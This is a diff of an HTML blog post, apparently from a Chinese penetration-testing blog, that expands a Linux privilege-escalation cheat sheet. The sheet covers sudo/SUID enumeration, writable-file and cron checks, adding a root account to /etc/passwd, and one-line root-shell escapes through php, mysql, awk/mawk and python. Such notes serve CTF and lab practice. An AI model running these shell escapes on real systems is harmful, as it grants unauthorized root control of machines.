@@ -49,7 +49,7 @@
         content="2021-12-01">
       <meta 
         property="og:article:modified_time" 
-        content="2021-12-03">
+        content="2021-12-08">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -325,7 +325,7 @@
     
     
       <span class="dot"></span>
-      <span>326 words</span>
+      <span>402 words</span>
     
   </div>
   
@@ -353,44 +353,33 @@
     id="section" 
     class="post-content">
     <h2 id="u63D0_u6743_u9014_u5F84"><a href="#u63D0_u6743_u9014_u5F84" class="headerlink" title="提权途径"></a>提权途径</h2><blockquote>
-<ol>
-<li><strong>sudo</strong>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">sudo <span class="token operator">-</span>l <span class="token comment">//查询具有sudo权限命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><strong>suid</strong>  </li>
-</ol>
-<ul>
+<h3 id="1-_sudo"><a href="#1-_sudo" class="headerlink" title="1. sudo"></a>1. sudo</h3><pre class="line-numbers language-none"><code class="language-none">sudo -l &#x2F;&#x2F;查询具有sudo权限命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="2-_suid"><a href="#2-_suid" class="headerlink" title="2. suid"></a>2. suid</h3><ul>
 <li>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。<br>如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。<br>其中，大家熟知的具有提权功能的Linux可执行文件包括：</li>
 </ul>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span> <span class="token comment">//查询具有suid执行权限程序</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>可利用的程序：<code>nmap、vim、find、bash、more、less、nano、cp、wget</code>  </p>
-<ol start="3">
-<li><strong>通过在/etc/passwd添加一个root权限账户</strong>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">find <span class="token operator">/</span> <span class="token operator">-</span>writable <span class="token operator">-</span>type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span> <span class="token comment">//查询可写权限的文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><strong>查看/etc/cron*下所含的所有文件</strong>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ls <span class="token operator">-</span>la <span class="token operator">/</span>etc<span class="token operator">/</span>cron<span class="token operator">*</span> <span class="token comment">//cron*是用来让使用者在固定时间或固定时间间隔执行程序之用(类似使用者的时程表),攻击者可根据root执行的程序寻找exp。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-</li>
-</ol>
+<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -u&#x3D;s type f 2&gt;&#x2F;dev&#x2F;null &#x2F;&#x2F;查询具有suid执行权限程序<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可利用的程序：<code>nmap、vim、find、bash、more、less、nano、cp、wget、python、mawk</code>  </p>
+<h3 id="3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><a href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237" class="headerlink" title="3. 通过在/etc/passwd添加一个root权限账户"></a>3. 通过在/etc/passwd添加一个root权限账户</h3><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -writable -type f 2&gt;&#x2F;dev&#x2F;null &#x2F;&#x2F;查询可写权限的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><a href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6" class="headerlink" title="4. 查看/etc/cron*下所含的所有文件"></a>4. 查看/etc/cron*下所含的所有文件</h3><pre class="line-numbers language-none"><code class="language-none">ls -la &#x2F;etc&#x2F;cron* &#x2F;&#x2F;cron*是用来让使用者在固定时间或固定时间间隔执行程序之用(类似使用者的时程表),攻击者可根据root执行的程序寻找exp。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </blockquote>
 <h2 id="u63D0_u6743"><a href="#u63D0_u6743" class="headerlink" title="提权"></a>提权</h2><blockquote>
-<ol>
-<li><strong>php</strong>  </li>
-</ol>
-<ul>
-<li>sudo<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">CMD</span><span class="token operator">=</span><span class="token string">"/bin/sh"</span>
-sudo php <span class="token operator">-</span>r <span class="token string">"system('$CMD');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>suid<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">sudo sh <span class="token operator">-</span>c <span class="token string">'cp $(which php) .; chmod +s ./php'</span>
-<span class="token constant">CMD</span><span class="token operator">=</span><span class="token string">"/bin/sh"</span>
-<span class="token punctuation">.</span><span class="token operator">/</span>php <span class="token operator">-</span>r <span class="token string">"pcntl_exec('/bin/sh',['-p']);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<h3 id="1-_php"><a href="#1-_php" class="headerlink" title="1. php"></a>1. php</h3><ul>
+<li>sudo<pre class="line-numbers language-none"><code class="language-none">CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
+sudo php -r &quot;system(&#39;$CMD&#39;);&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<li>suid<pre class="line-numbers language-none"><code class="language-none">sudo sh -c &#39;cp $(which php) .; chmod +s .&#x2F;php&#39;
+CMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;
+.&#x2F;php -r &quot;pcntl_exec(&#39;&#x2F;bin&#x2F;sh&#39;,[&#39;-p&#39;]);&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
 </ul>
-<ol start="2">
-<li><strong>mysql</strong>  </li>
-</ol>
-<ul>
-<li>sudo<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">sudo <span class="token operator">-</span>u root mysql <span class="token operator">-</span>e <span class="token string">'\! /bin/bash'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<h3 id="2-_mysql"><a href="#2-_mysql" class="headerlink" title="2. mysql"></a>2. mysql</h3><ul>
+<li>sudo<br><code>sudo -u root mysql -e &#39;\! /bin/bash&#39;</code>  </li>
 </ul>
-<ol start="3">
-<li><strong>awk/mawk</strong>  </li>
-</ol>
-<ul>
-<li>sudo<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">sudo <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>awk <span class="token string">'&#123;system("/bin/bash")&#125;'</span>
-mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+<h3 id="3-_awk/mawk"><a href="#3-_awk/mawk" class="headerlink" title="3. awk/mawk"></a>3. awk/mawk</h3><ul>
+<li>sudo<br><code>sudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>  </li>
+<li>suid<br><code>mawk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code></li>
+</ul>
+<h3 id="4-_python"><a href="#4-_python" class="headerlink" title="4. python"></a>4. python</h3><ul>
+<li>suid<br><code>python -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;</code>  </li>
 </ul>
 </blockquote>
 
@@ -463,7 +452,7 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_sudo"><span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_suid"><span class="toc-text">2. suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><span class="toc-text">3. 通过在&#x2F;etc&#x2F;passwd添加一个root权限账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><span class="toc-text">4. 查看&#x2F;etc&#x2F;cron*下所含的所有文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_php"><span class="toc-text">1. php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_mysql"><span class="toc-text">2. mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_awk/mawk"><span class="toc-text">3. awk&#x2F;mawk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-_python"><span class="toc-text">4. python</span></a></li></ol></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -482,7 +471,7 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>13</span>
+    <span>14</span>
     <span>Posts</span>
   </a>
   <a 
@@ -527,7 +516,7 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_sudo"><span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_suid"><span class="toc-text">2. suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><span class="toc-text">3. 通过在&#x2F;etc&#x2F;passwd添加一个root权限账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><span class="toc-text">4. 查看&#x2F;etc&#x2F;cron*下所含的所有文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_php"><span class="toc-text">1. php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_mysql"><span class="toc-text">2. mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_awk/mawk"><span class="toc-text">3. awk&#x2F;mawk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-_python"><span class="toc-text">4. python</span></a></li></ol></li></ol>
       </div>
     </article>
   
@@ -552,7 +541,7 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
       <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
         <div class="categories-list-item">
           渗透测试
-          <span class="categories-list-item-badge">9</span>
+          <span class="categories-list-item-badge">10</span>
         </div>
       </a>
     
@@ -655,7 +644,7 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743_u9014_u5F84"><span class="toc-text">提权途径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_sudo"><span class="toc-text">1. sudo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_suid"><span class="toc-text">2. suid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-__u901A_u8FC7_u5728/etc/passwd_u6DFB_u52A0_u4E00_u4E2Aroot_u6743_u9650_u8D26_u6237"><span class="toc-text">3. 通过在&#x2F;etc&#x2F;passwd添加一个root权限账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-__u67E5_u770B/etc/cron*_u4E0B_u6240_u542B_u7684_u6240_u6709_u6587_u4EF6"><span class="toc-text">4. 查看&#x2F;etc&#x2F;cron*下所含的所有文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u63D0_u6743"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_php"><span class="toc-text">1. php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-_mysql"><span class="toc-text">2. mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_awk/mawk"><span class="toc-text">3. awk&#x2F;mawk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-_python"><span class="toc-text">4. python</span></a></li></ol></li></ol>
     </article>
   
   
@@ -670,6 +659,11 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-12-08</div>
+        <a href="/e4c5a7f9.html"><div class="recent-posts-item-content">Vulnhub|Toppo</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-12-07</div>
         <a href="/63d10771.html"><div class="recent-posts-item-content">Vulnhub|JIS-CTF-VulnUpload-CTF01</div></a>
       </div>
@@ -682,11 +676,6 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-12-06</div>
         <a href="/8c54db8b.html"><div class="recent-posts-item-content">命令</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-06</div>
-        <a href="/d4ec2f86.html"><div class="recent-posts-item-content">Vulnhub|SickOs1.2</div></a>
       </div>
     
   </div>
